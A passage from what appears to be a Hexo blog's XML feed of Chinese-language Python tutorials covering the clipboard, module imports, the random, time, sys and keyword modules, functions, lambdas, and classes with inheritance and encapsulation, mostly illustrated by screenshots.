src="/2020/10/05/Python-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8E%E5%86%99%E5%85%A5/image-20201006163020610.png" alt="image-20201006163020610"></p><h2 id="剪切板"><a href="#剪切板" class="headerlink" title="剪切板"></a>剪切板</h2><p>剪贴板的功能是属第三方pyperclip模块内，使用前需使用下列方式安装此模块。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install pyperclip</span><br></pre></td></tr></table></figure><p>然后程序前面导入pyperclip模块功能:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import pyperclip</span><br></pre></td></tr></table></figure><p>安装完成后就可以使用下列两个方法：</p><ol><li>copy( )：可将列表数据复制至剪贴板。</li><li>paste( )：将剪贴板数据复制回字符串变量.。</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="python" scheme="http://yoursite.com/categories/python/"/>
    
    
      <category term="python" scheme="http://yoursite.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>Python-模块</title>
    <link href="http://yoursite.com/2020/10/05/Python-%E6%A8%A1%E5%9D%97/"/>
    <id>http://yoursite.com/2020/10/05/Python-模块/</id>
    <published>2020-10-05T02:44:47.000Z</published>
    <updated>2020-10-05T03:54:58.665Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h1 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h1><p>在大型计划的程序设计中，每个人可能只是负责一小功能的函数或类设计，为了可以让团队的其他人可以互相分享设计成果，最后每个人所负责的功能函数或类将存储在模块(module)中，然后供团队其他成员使用。</p><h2 id="将自建函数存储在模块中"><a href="#将自建函数存储在模块中" class="headerlink" title="将自建函数存储在模块中"></a>将自建函数存储在模块中</h2><p>一个大型程序一定是由许多的函数或类所组成，为了让程序的工作可以分工以及增加程序的可读性，可以将所建的函数或类存储成模块(module)形式的独立文件，未来再加以调用引用。</p><p>模块的扩展名与Python程序文件一样，是py。</p><p>如建立一个模块，此模块名称是makefood.py：</p><p><img src="/2020/10/05/Python-%E6%A8%A1%E5%9D%97/image-20201005105636944.png" alt="image-20201005105636944"></p><h2 id="应用建立的函数模块"><a href="#应用建立的函数模块" class="headerlink" title="应用建立的函数模块"></a>应用建立的函数模块</h2><h4 id="import模块名称"><a href="#import模块名称" class="headerlink" title="import模块名称"></a>import模块名称</h4><p>要导入模块所用语法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import 模块名 #导入模块</span><br></pre></td></tr></table></figure><p>程序中要引用模块中的函数语法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">模块名称.函数名称</span><br></pre></td></tr></table></figure><h4 id="导入模块内特定单一函数"><a href="#导入模块内特定单一函数" class="headerlink" title="导入模块内特定单一函数"></a>导入模块内特定单一函数</h4><p>如果只想导入模块内单一特定的函数，可以使用下列语法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">from 模块名称 import 函数名称</span><br></pre></td></tr></table></figure><p>程序引用所导入的函数时可以省略模块名称。</p><h4 id="导入模块内多个函数"><a href="#导入模块内多个函数" class="headerlink" title="导入模块内多个函数"></a>导入模块内多个函数</h4><p>如果想导入模块内多个函数，函数名称间需以逗号隔开，语法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">from 模块名称  import 函数名称1，函数名称2，函数名称3....</span><br></pre></td></tr></table></figure><h4 id="导入模块内所有函数"><a href="#导入模块内所有函数" class="headerlink" title="导入模块内所有函数"></a>导入模块内所有函数</h4><p>如果想导入模块内所有函数，语法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">from 模块 import *</span><br></pre></td></tr></table></figure><h4 id="使用as给函数指定替代名称"><a href="#使用as给函数指定替代名称" class="headerlink" title="使用as给函数指定替代名称"></a>使用as给函数指定替代名称</h4><p>可以自行给模块的函数名称一个替代名称，未来可以使用这个替代名称代替原先模块的名称。语法格式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">from 模块名称 import 函数名称 as 替代名称</span><br></pre></td></tr></table></figure><h4 id="给模块指定替代名称"><a href="#给模块指定替代名称" class="headerlink" title="给模块指定替代名称"></a>给模块指定替代名称</h4><p>Python也允许给模块替代名称，未来可以使用此替代名称导入模块，其语法格式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import 函数名称 as 替代名称</span><br></pre></td></tr></table></figure><h2 id="将自建的类的存储在模块中"><a href="#将自建的类的存储在模块中" class="headerlink" title="将自建的类的存储在模块中"></a>将自建的类的存储在模块中</h2><p>当程序设计越来越复杂时，可能我们也会建立许多类，Python也允许我们将所建立的类储存在模块内。</p><h4 id="建立类内容的模块"><a href="#建立类内容的模块" class="headerlink" title="建立类内容的模块"></a>建立类内容的模块</h4><p>模块的扩展名与Python程序文件一样，是py。</p><p>如建立一个模块，此模块名称是banks.py：</p><p><img src="/2020/10/05/Python-%E6%A8%A1%E5%9D%97/image-20201005111329305.png" alt="image-20201005111329305"></p><h2 id="应用建立的类模块"><a href="#应用建立的类模块" class="headerlink" title="应用建立的类模块"></a>应用建立的类模块</h2><h4 id="导入模块的单一类"><a href="#导入模块的单一类" class="headerlink" title="导入模块的单一类"></a>导入模块的单一类</h4><p>语法格式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">from 模块名称 import 类名称</span><br></pre></td></tr></table></figure><p>如导入Banks类：</p><p><img src="/2020/10/05/Python-%E6%A8%A1%E5%9D%97/image-20201005111612456.png" alt="image-20201005111612456"></p><h4 id="导入模块的多个类"><a href="#导入模块的多个类" class="headerlink" title="导入模块的多个类"></a>导入模块的多个类</h4><p>使用下列方式导入多个类别，所导入的类别名称间需以逗号隔开。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">from 模块名称 import 类名称1，类名称2....</span><br></pre></td></tr></table></figure><h4 id="导入模块内的所有类"><a href="#导入模块内的所有类" class="headerlink" title="导入模块内的所有类"></a>导入模块内的所有类</h4><p>导入模块内所有类别，语法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">from 模块名称 import *</span><br></pre></td></tr></table></figure><h4 id="模块内导入另一个模块的类"><a href="#模块内导入另一个模块的类" class="headerlink" title="模块内导入另一个模块的类"></a>模块内导入另一个模块的类</h4><p>有时候可能一个模块内有太多类别了，此时可以考虑将一系列的类别分成2个或更多个模块储存。如果拆成类别的模块彼此有衍生关系，则子类别也需将父类别导入，执行时才不会有错误产生。</p><p>如在下面的这个程序中，分别导入了两个模块</p><p><img src="/2020/10/05/Python-%E6%A8%A1%E5%9D%97/image-20201005112102241.png" alt="image-20201005112102241"></p><h2 id="随机数random模块"><a href="#随机数random模块" class="headerlink" title="随机数random模块"></a>随机数random模块</h2><p>所谓的随机数是指平均散布在某区间的数字，随机数其实用途很广，最常见的应用是设计游戏时可以控制输出结果。</p><h4 id="randint"><a href="#randint" class="headerlink" title="randint()"></a>randint()</h4><p>这个方法可以随机产生指定区间的整数，它的语法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">randint(min,max) #可以产生min与max之间的整数值</span><br></pre></td></tr></table></figure><p>如猜数字游戏，这个程序首先会用randint( )方法产生一个1到10之间的数字，然后如果猜的数值太小会要求猜大一些，如果猜的数值太大会要求猜小一些，最后列出猜了几次才答对。</p><p><img src="/2020/10/05/Python-%E6%A8%A1%E5%9D%97/image-20201005112423088.png" alt="image-20201005112423088"></p><p>一般赌场的机器其实可以用随机数控制输赢，例如：某个猜大小机器，一般人以为猜对率是50%，但是只要控制随机数，赌场可以直接控制输赢比例。</p><p><img src="/2020/10/05/Python-%E6%A8%A1%E5%9D%97/image-20201005112557560.png" alt="image-20201005112557560"></p><p>庄家可以在程序启动时先设定赢的比率。第2个关键点是程序产生的随机数，由1～100的随机数决定玩家是赢或输，猜大小只是幌子。例如，庄家刚开始设定赢的机率是80%，相当于如果随机数是在81～100的算玩家赢，如果随机数是1～80算玩家输。</p><p><img src="/2020/10/05/Python-%E6%A8%A1%E5%9D%97/image-20201005112801874.png" alt="image-20201005112801874"></p><h4 id="choice"><a href="#choice" class="headerlink" title="choice()"></a>choice()</h4><p>这个方法可以在一个列表(list)中随机传回一个元素。</p><p>如有一个水果列表，使用choice( )方法随机选取一个水果。</p><p><img src="/2020/10/05/Python-%E6%A8%A1%E5%9D%97/image-20201005112940391.png" alt="image-20201005112940391"></p><h4 id="shuffle"><a href="#shuffle" class="headerlink" title="shuffle()"></a>shuffle()</h4><p>这个方法可以将列表元素重新排列，扑克牌(Porker)游戏，在发牌前可以使用这个方法将牌打乱重新排列。</p><p>如将列表内的扑克牌次序打乱，然后重新排列。</p><p><img src="/2020/10/05/Python-%E6%A8%A1%E5%9D%97/image-20201005113123051.png" alt="image-20201005113123051"></p><p>执行结果：</p><p><img src="/2020/10/05/Python-%E6%A8%A1%E5%9D%97/image-20201005113202439.png" alt="image-20201005113202439"></p><h2 id="时间time-模块"><a href="#时间time-模块" class="headerlink" title="时间time()模块"></a>时间time()模块</h2><h4 id="time"><a href="#time" class="headerlink" title="time()"></a>time()</h4><p>time( )方法可以传回自1970年1月1日00:00:00AM以来的秒数。</p><p>如计算自1970年1月1日00:00:00AM以来的秒数：</p><p><img src="/2020/10/05/Python-%E6%A8%A1%E5%9D%97/image-20201005113510187.png" alt="image-20201005113510187"></p><p>执行结果：</p><p><img src="/2020/10/05/Python-%E6%A8%A1%E5%9D%97/image-20201005113555999.png" alt="image-20201005113555999"></p><h4 id="sleep"><a href="#sleep" class="headerlink" title="sleep()"></a>sleep()</h4><p>sleep( )方法可以让工作暂停，这个方法的参数单位是秒。</p><p>如每秒打印一次列表的内容：</p><p><img src="/2020/10/05/Python-%E6%A8%A1%E5%9D%97/image-20201005113719219.png" alt="image-20201005113719219"></p><p>执行结果：</p><p><img src="/2020/10/05/Python-%E6%A8%A1%E5%9D%97/image-20201005113744430.png" alt="image-20201005113744430"></p><h4 id="asctime"><a href="#asctime" class="headerlink" title="asctime()"></a>asctime()</h4><p>这个方法会以可以阅读方式列出目前系统时间。</p><p>如列出目前系统的时间：</p><p><img src="/2020/10/05/Python-%E6%A8%A1%E5%9D%97/image-20201005114056882.png" alt="image-20201005114056882"></p><p>执行结果：</p><p><img src="/2020/10/05/Python-%E6%A8%A1%E5%9D%97/image-20201005114120954.png" alt="image-20201005114120954"></p><h4 id="localtime"><a href="#localtime" class="headerlink" title="localtime()"></a>localtime()</h4><p>这个方法可以返回目前时间的结构数据，所返回的结构可以用索引方式获得个别内容。</p><p>使用localtime( )方法列出目前时间的结构数据，同时使用索引列出个别内容。</p><p><img src="/2020/10/05/Python-%E6%A8%A1%E5%9D%97/image-20201005114233599.png" alt="image-20201005114233599"></p><p>执行结果：</p><p><img src="/2020/10/05/Python-%E6%A8%A1%E5%9D%97/image-20201005114337802.png" alt="image-20201005114337802"></p><h2 id="系统sys模块"><a href="#系统sys模块" class="headerlink" title="系统sys模块"></a>系统sys模块</h2><p>这个模块可以控制Python Shell窗口信息。</p><h4 id="version"><a href="#version" class="headerlink" title="version()"></a>version()</h4><p>这个属性可以列出目前所使用Python的版本信息。</p><h4 id="stdin对象"><a href="#stdin对象" class="headerlink" title="stdin对象"></a>stdin对象</h4><p>这是一个对象，stdin是standard input的缩写，是指从屏幕输入（可想成PythonShell窗口），这个对象可以搭配readline( )方法，然后可以读取屏幕输入直到按下Enter键的字符串。</p><p>如从屏幕读取8个字符数的应用：</p><p><img src="/2020/10/05/Python-%E6%A8%A1%E5%9D%97/image-20201005114656329.png" alt="image-20201005114656329"></p><h4 id="stdout对象"><a href="#stdout对象" class="headerlink" title="stdout对象"></a>stdout对象</h4><p>这是一个对象，stdout是standard ouput的缩写，是指从屏幕输出（可想成Python Shell窗口），这个对象可以搭配write( )方法，然后可以从屏幕输出数据。</p><p>如使用stdout对象输出内容：</p><p><img src="/2020/10/05/Python-%E6%A8%A1%E5%9D%97/image-20201005114745601.png" alt="image-20201005114745601"></p><h2 id="keyword-模块"><a href="#keyword-模块" class="headerlink" title="keyword()模块"></a>keyword()模块</h2><p>这个模块有一些Python关键词的功能。</p><h4 id="kwlist属性"><a href="#kwlist属性" class="headerlink" title="kwlist属性"></a>kwlist属性</h4><p>这个属性含所有Python的关键词。</p><p><img src="/2020/10/05/Python-%E6%A8%A1%E5%9D%97/image-20201005115247148.png" alt="image-20201005115247148"></p><p>执行结果：</p><p><img src="/2020/10/05/Python-%E6%A8%A1%E5%9D%97/image-20201005115310167.png" alt="image-20201005115310167"></p><h4 id="iskeyword"><a href="#iskeyword" class="headerlink" title="iskeyword()"></a>iskeyword()</h4><p>这个方法可以传回参数的字符串是否是关键词，如果是传回True，如果否传回False。</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="python" scheme="http://yoursite.com/categories/python/"/>
    
    
      <category term="python" scheme="http://yoursite.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>Python-基础5</title>
    <link href="http://yoursite.com/2020/10/05/Python-%E5%9F%BA%E7%A1%805/"/>
    <id>http://yoursite.com/2020/10/05/Python-基础5/</id>
    <published>2020-10-05T02:27:18.000Z</published>
    <updated>2020-10-05T02:41:08.290Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><h4 id="函数的定义"><a href="#函数的定义" class="headerlink" title="函数的定义"></a>函数的定义</h4><p>函数的语法格式如下：</p><p><img src="/2020/10/05/Python-%E5%9F%BA%E7%A1%805/image-20201003103823057.png" alt="image-20201003103823057"></p><p>函数名称 名称必须是唯一的，程序未来可以调用引用。</p><p>参数值可有可无的，完全视函数设计需要，可以接收调用函数传来的变量，各参数值之间是用逗号“,”隔开。</p><p>return [返回值1,返回值2 , … ]不论是return或接续右边的返回值皆是可有可无，如果有返回多个数据彼此需以逗号“,”隔开。</p><h4 id="函数的参数设计"><a href="#函数的参数设计" class="headerlink" title="函数的参数设计"></a>函数的参数设计</h4><p>在真实的函数设计与应用中大多是需要传递一些参数的。</p><p>如传递一个参数：</p><p><img src="/2020/10/05/Python-%E5%9F%BA%E7%A1%805/image-20201003152402426.png" alt="image-20201003152402426"></p><p>当所设计的函数需要传递多个参数，调用此函数时就需要特别留意传递参数的位置需要正确，最后才可以获得正确的结果。最常见的传递参数是数值或字符串数据。</p><p>如设计减法的函数subtract( )，第一个参数会减去第二个参数，然后列出执行结果。</p><p><img src="/2020/10/05/Python-%E5%9F%BA%E7%A1%805/image-20201003152522193.png" alt="image-20201003152522193"></p><p>关键词参数(keyword arguments)是指调用函数时，参数是用参数名称=值配对方式呈现。Python也允许在调用需传递多个参数的函数时，直接将参数名称=值用配对方式传送，这个时候参数的位置就不重要了。</p><p><img src="/2020/10/05/Python-%E5%9F%BA%E7%A1%805/image-20201003152806604.png" alt="image-20201003152806604"></p><h4 id="函数返回none"><a href="#函数返回none" class="headerlink" title="函数返回none"></a>函数返回none</h4><p>Python在直译时会自动返回处理成“return None”，相当于返回None。在一些程序语言，例如，C语言这个None就是NULL，None在Python中独立成为一个数据类型NoneType。</p><p><img src="/2020/10/05/Python-%E5%9F%BA%E7%A1%805/image-20201003153234774.png" alt="image-20201003153234774"></p><p>执行结果：</p><p><img src="/2020/10/05/Python-%E5%9F%BA%E7%A1%805/image-20201003153305754.png" alt="image-20201003153305754"></p><h4 id="函数返回数值"><a href="#函数返回数值" class="headerlink" title="函数返回数值"></a>函数返回数值</h4><p>参数具有返回值功能，将可以大大增加程序的可读性，返回的基本方式为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return result  #result就是返回的值</span><br></pre></td></tr></table></figure><p>使用return返回函数数据时，也允许返回多个数据，各个数据间只要以逗号隔开即可。</p><p><img src="/2020/10/05/Python-%E5%9F%BA%E7%A1%805/image-20201003155117536.png" alt="image-20201003155117536"></p><h4 id="函数返回字典数据"><a href="#函数返回字典数据" class="headerlink" title="函数返回字典数据"></a>函数返回字典数据</h4><p>函数除了可以返回数值或字符串数据外，也可以返回比较复杂的数据，例如，字典或列表等。</p><p>如调用时会输入VIP_ID编号和Name姓名数据，函数将返回所建立的字典数据：</p><p><img src="/2020/10/05/Python-%E5%9F%BA%E7%A1%805/image-20201003155456390.png" alt="image-20201003155456390"></p><h4 id="调用函数时参数是列表"><a href="#调用函数时参数是列表" class="headerlink" title="调用函数时参数是列表"></a>调用函数时参数是列表</h4><p>在调用函数时，也可以将列表（此列表可以是由数值、字符串或字典所组成）当参数传递给函数，然后函数可以遍历列表内容，然后执行更进一步的运作。</p><p>如函数遍历列表：</p><p><img src="/2020/10/05/Python-%E5%9F%BA%E7%A1%805/image-20201003155759704.png" alt="image-20201003155759704"></p><h4 id="传递任意数量的参数"><a href="#传递任意数量的参数" class="headerlink" title="传递任意数量的参数"></a>传递任意数量的参数</h4><p>在设计Python的函数时，有时候可能会碰上不知道会有多少个参数会传递到这个函数。</p><p>如建立一个冰淇淋的配料程序，一般冰淇淋可以在上面加上配料，这个程序在调用制作冰淇淋函数make_icecream( )时，可以传递0到多个配料，然后make_icecream( )函数会将配料结果的冰淇淋列出来。</p><p><img src="/2020/10/05/Python-%E5%9F%BA%E7%A1%805/image-20201003160237052.png" alt="image-20201003160237052"></p><h4 id="递归式函数设计recursive"><a href="#递归式函数设计recursive" class="headerlink" title="递归式函数设计recursive"></a>递归式函数设计recursive</h4><p>一个函数可以调用其他函数也可以调用自己，其中调用本身的动作称递归式(recursive)调用，递归式调用有下列特色：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">每次调用自己时，都会使范围越来越小。</span><br><span class="line"></span><br><span class="line">必须要有一个终止的条件来结束递归函数。</span><br></pre></td></tr></table></figure><p>递归函数最常见的应用是处理正整数的阶乘(factorial)，一个正整数的阶乘是所有小于以及等于该数的正整数的积，同时如果正整数是0则阶乘为1，依照观念正整数是1时阶乘也是1。此阶乘数字的表示法为n!。</p><p>如使用递归函数执行阶乘(factorial)运算：</p><p><img src="/2020/10/05/Python-%E5%9F%BA%E7%A1%805/image-20201003160601838.png" alt="image-20201003160601838"></p><p>执行结果：</p><p><img src="/2020/10/05/Python-%E5%9F%BA%E7%A1%805/image-20201003160632987.png" alt="image-20201003160632987"></p><p>上述factorial( )函数的终止条件是参数值为1的情况，由第4行判断然后返回1，下列是正整数为3时递归函数的示意：</p><p><img src="/2020/10/05/Python-%E5%9F%BA%E7%A1%805/image-20201003160741064.png" alt="image-20201003160741064"></p><h4 id="局部变量与全局变量"><a href="#局部变量与全局变量" class="headerlink" title="局部变量与全局变量"></a>局部变量与全局变量</h4><p>某个变量只有在该函数内使用，影响范围限定在这个函数内，这个变量称局部变量(local variable)。如果某个变量的影响范围是在整个程序，则这个变量称全局变量(global variable)。</p><p>Python程序在调用函数时会建立一个内存工作区间，在这个内存工作区间可以处理属于这个函数的变量，当函数工作结束，返回原先调用程序时，这个内存工作区间就被收回，原先存在的变量也将被销毁，这也是为何局部变量的影响范围只限定在所属的函数内。</p><p>一般在主程序内建立的变量称全局变量，这个变量程序内与本程序的所有函数皆可以引用。如设定一个全局变量，然后函数也可以调用引用：</p><p><img src="/2020/10/05/Python-%E5%9F%BA%E7%A1%805/image-20201003161110904.png" alt="image-20201003161110904"></p><p>全局变量与函数内的局部变量不要使用相同的名称，因为很容易造成混淆。如果全局变量与函数内的局部变量使用相同的名称，Python会将相同名称的区域与全局变量视为不同的变量，在局部变量所在的函数是使用局部变量内容，其他区域则是使用全局变量的内容。</p><p>如局部变量与全局变量定义了相同的变量msg，但是内容不相同。然后执行打印，可以发现在函数与主程序所打印的内容有不同的结果。</p><p><img src="/2020/10/05/Python-%E5%9F%BA%E7%A1%805/image-20201003161301240.png" alt="image-20201003161301240"></p><p>执行结果：</p><p><img src="/2020/10/05/Python-%E5%9F%BA%E7%A1%805/image-20201003162247407.png" alt="image-20201003162247407"></p><h4 id="程序设计需要注意"><a href="#程序设计需要注意" class="headerlink" title="程序设计需要注意"></a>程序设计需要注意</h4><p>一般程序设计时有关使用局部变量需注意下列事项：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">局部变量内容无法在其他函数引用.</span><br><span class="line"></span><br><span class="line">局部变量内容无法在主程序引用.</span><br></pre></td></tr></table></figure><h4 id="lambda函数"><a href="#lambda函数" class="headerlink" title="lambda函数"></a>lambda函数</h4><p>所谓的匿名函数(anonymous function)是指一个没有名称的函数，Python是使用def定义一般函数，匿名函数则是使用lambda来定义，有的人称之为lambda表达式，也可以将匿名函数称lambda函数。通常会将匿名函数与Python的内置函数filter( )、map( )等共同使用，此时匿名函数将只是这些函数的参数。</p><p>匿名函数最大特色是可以有许多的参数，但是只能有一个程序码表达式，然后可以将执行结果返回。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lambda arg1,arg2.... :expression  #arg1为参数，可以有多个参数</span><br></pre></td></tr></table></figure><p>单一参数的匿名函数应用，可以返回平方值：</p><p><img src="/2020/10/05/Python-%E5%9F%BA%E7%A1%805/image-20201004201336873.png" alt="image-20201004201336873"></p><p>含2个参数的匿名函数应用，可以返回参数的积：</p><p><img src="/2020/10/05/Python-%E5%9F%BA%E7%A1%805/image-20201004201451152.png" alt="image-20201004201451152"></p><h4 id="匿名函数使用与filter"><a href="#匿名函数使用与filter" class="headerlink" title="匿名函数使用与filter( )"></a>匿名函数使用与filter( )</h4><p>匿名函数一般是用在不需要函数名称的场合，例如，一些高阶函数(higher-orderfunction)的参数可能是函数，这时就很适合使用匿名函数，同时让程序变得更简洁。有一个内置函数filter( )，它的语法格式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filter(function,iterable)</span><br></pre></td></tr></table></figure><p>函数将依次对iterable(可以重复执行，例如，字符串string、列表list或元组tuple)的元素(item)放入function(item)内，然后将function( )函数执行结果是True的元素(item)组成新的筛选对象(filter object)返回。</p><h4 id="匿名函数使用与map"><a href="#匿名函数使用与map" class="headerlink" title="匿名函数使用与map( )"></a>匿名函数使用与map( )</h4><p>内置函数map( )，它的语法格式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">map(function,interable)</span><br></pre></td></tr></table></figure><p>函数将依次对iterable(可以重复执行，例如，字符串string、列表list或元组tuple)的元素(item)放入function(item)内，然后将function( )函数执行结果组成新的筛选对象(filter object)返回。</p><h2 id="类-面向对象程序"><a href="#类-面向对象程序" class="headerlink" title="类-面向对象程序"></a>类-面向对象程序</h2><p>Python其实是一种面向对象的编程(Object Oriented Programming)，在Python中其实所有的数据类型皆是对象，Python也允许程序设计师自创数据类型，这种自创的数据类型就是类。</p><p>设计程序时可以将世间万物分组归类，然后使用类(class)定义你的分类。</p><h4 id="类的定义及使用"><a href="#类的定义及使用" class="headerlink" title="类的定义及使用"></a>类的定义及使用</h4><p>类的语法定义如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class classname():    #类名称第一个字母必须大写</span><br><span class="line">  statement1</span><br><span class="line">  ......</span><br></pre></td></tr></table></figure><p>如对银行的类定义：</p><p><img src="/2020/10/05/Python-%E5%9F%BA%E7%A1%805/image-20201004202307701.png" alt="image-20201004202307701"></p><p>Banks是类名称，在这个类中定义了一个属性(attribute)title与一个方法(method)motto。</p><p>在类内定义方法(method)的方式与定义函数的方式相同，但是不可以称之为函数(function)，必须称之为方法(method)，在程序设计时我们可以随时调用函数，但是只有属于该类的对象(object)才可调用相关的方法。</p><h4 id="操作类的属性与方法"><a href="#操作类的属性与方法" class="headerlink" title="操作类的属性与方法"></a>操作类的属性与方法</h4><p>操作类的属性与方法首先需定义该类的对象(object)变量，使用下列方式操作：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">object.类的属性</span><br><span class="line">object.类的方法()</span><br></pre></td></tr></table></figure><h4 id="类的构造函数"><a href="#类的构造函数" class="headerlink" title="类的构造函数"></a>类的构造函数</h4><p>建立类很重要的一个工作是初始化整个类，所谓的初始化类是在类内建立一个初始化方法(method)，这是一个特殊方法，当在程序内定义这个类的对象时将自动执行这个方法。初始化方法有一个固定名称是“<strong>init</strong>( )”，写法是init左右皆是2个底线字符，init其实是initialization的缩写，通常又将这类初始化的方法称构造函数(constructor)。</p><p>如设定初始化方法，同时存第一笔开户的钱100元入银行，然后列出存款金额。</p><p><img src="/2020/10/05/Python-%E5%9F%BA%E7%A1%805/image-20201004202809117.png" alt="image-20201004202809117"></p><h4 id="类的访问权限-封装"><a href="#类的访问权限-封装" class="headerlink" title="类的访问权限-封装"></a>类的访问权限-封装</h4><p>类内的属性可以让外部引用的称公有(public)属性，而可以让外部引用的方法称公有方法。Python也提供一个私有属性与方法的观念，这个观念的主要精神是类外无法直接更改类内的私有属性，类外也无法直接调用私有方法，这个观念又称封装(encapsulation)。</p><p>Python对于类内的属性增加了私有属性(private attribute)的观念，应用方式是定义时在属性名称前面增加__(2个底线)，定义为私有属性后，类外的程序就无法引用了。</p><p>封装前：</p><p><img src="/2020/10/05/Python-%E5%9F%BA%E7%A1%805/image-20201004203310489.png" alt="image-20201004203310489"></p><p>封装后：</p><p><img src="/2020/10/05/Python-%E5%9F%BA%E7%A1%805/image-20201004203350625.png" alt="image-20201004203350625"></p><p>类有私有的属性，那么也有私有方法(private method)，它的观念与私有属性类似，类外的程序无法调用。至于定义方式与私有属性相同，只要在方法前面加上__(2个底线)符号即可。</p><h4 id="类的继承"><a href="#类的继承" class="headerlink" title="类的继承"></a>类的继承</h4><p>在面向对象程序设计中类是可以继承的，其中被继承的类称父类(parent class)或基类(base class)，继承的类称子类(child class)或衍生类(derived class)。类继承的最大优点是许多父类的公有方法或属性，在子类中不用重新设计，可以直接引用。</p><p><img src="/2020/10/05/Python-%E5%9F%BA%E7%A1%805/image-20201004203553583.png" alt="image-20201004203553583"></p><p>在程序设计时，基类(base class)必须在衍生类(derived class)前面，整个程序代码结构如下：</p><p><img src="/2020/10/05/Python-%E5%9F%BA%E7%A1%805/image-20201004203633339.png" alt="image-20201004203633339"></p><p>衍生类继承了基类的公有属性与方法，同时也可以有自己的属性与方法。</p><p>如Banks类建立一个分行Shilin_Banks，这个衍生类没有任何数据，直接引用基类的公有函数，执行银行的存款作业：</p><p><img src="/2020/10/05/Python-%E5%9F%BA%E7%A1%805/image-20201004203745811.png" alt="image-20201004203745811"></p><p>如何取得基类的私有属性？</p><p>基于保护原因，类外是无法直接取得类内的私有属性，即使是它的衍生类也无法直接读取，如果真要取得可以使用return方式，传回私有属性内容。</p><p>如衍生类对象取得基类的银行名称title的属性：</p><p><img src="/2020/10/05/Python-%E5%9F%BA%E7%A1%805/image-20201004204206862.png" alt="image-20201004204206862"></p><p>执行结果：</p><p><img src="/2020/10/05/Python-%E5%9F%BA%E7%A1%805/image-20201004204230275.png" alt="image-20201004204230275"></p><h4 id="多重继承"><a href="#多重继承" class="headerlink" title="多重继承"></a>多重继承</h4><p>在面向对象的程序设计中，也常会发生一个类继承多个类的应用，此时子类也同时继承了多个类的方法。在这个时候，当多个父类拥有相同名称的方法时，应该先执行哪一个父类的方法。在程序中可用下列语法代表继承多个类。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">class 类名称(父类1，父类2.....，父类n)</span><br><span class="line">      类内容</span><br></pre></td></tr></table></figure><h4 id="type与instance"><a href="#type与instance" class="headerlink" title="type与instance"></a>type与instance</h4><p>可以使用type( )函数得到某一对象变量的类。</p><p>isinstance( )函数可以传回对象的类是否属于某一类，它包含2个参数，它的语法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">isinstance(对象，类)   #可传回True或False</span><br></pre></td></tr></table></figure><p>如果对象的类是属于第2个参数类或属于第2个参数的子类，则传回True，否则传回False。</p><h4 id="特殊属性-文档字符串doc"><a href="#特殊属性-文档字符串doc" class="headerlink" title="特殊属性-文档字符串doc"></a>特殊属性-文档字符串<em>doc</em></h4><p>若是遇到<strong>xx</strong>类的字符串就要特别留意了，这些大多数是特殊属性或方法。</p><p>文档字符串的英文原意是文档字符串(docstring)，Python鼓励程序设计师在设计函数或类时，尽量为函数或类增加文档的批注，未来可以使用<strong>doc</strong>特殊属性列出此文档批注。</p><p>如将文档批注应用在函数：</p><p><img src="/2020/10/05/Python-%E5%9F%BA%E7%A1%805/image-20201004205537211.png" alt="image-20201004205537211"></p><h4 